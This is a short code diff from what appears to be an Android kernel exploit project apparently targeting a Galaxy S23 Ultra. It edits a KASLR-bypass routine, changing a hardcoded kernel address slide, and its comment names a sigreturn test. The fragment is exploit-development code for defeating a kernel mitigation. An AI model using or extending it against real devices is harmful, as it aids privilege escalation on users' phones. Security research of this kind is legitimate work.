@@ -136,7 +136,7 @@ static int slide_tracefs_leak_kernel_base(void) {
 
 int slide_leak_kernel_base(void) {
       /* HARDCODED BYPASS FOR S23U SIGRETURN TEST */
-    slide_p0_offset = 0;   // ← KASLR slide = 0//0x2c05080;
+    slide_p0_offset = 0x80000;   // ← KASLR slide = 0x80000//0x2c05080;
     kaslr_base = KIMAGE_TEXT_BASE + slide_p0_offset;
     kaslr_slide = slide_p0_offset;
     kaslr_done = 1;
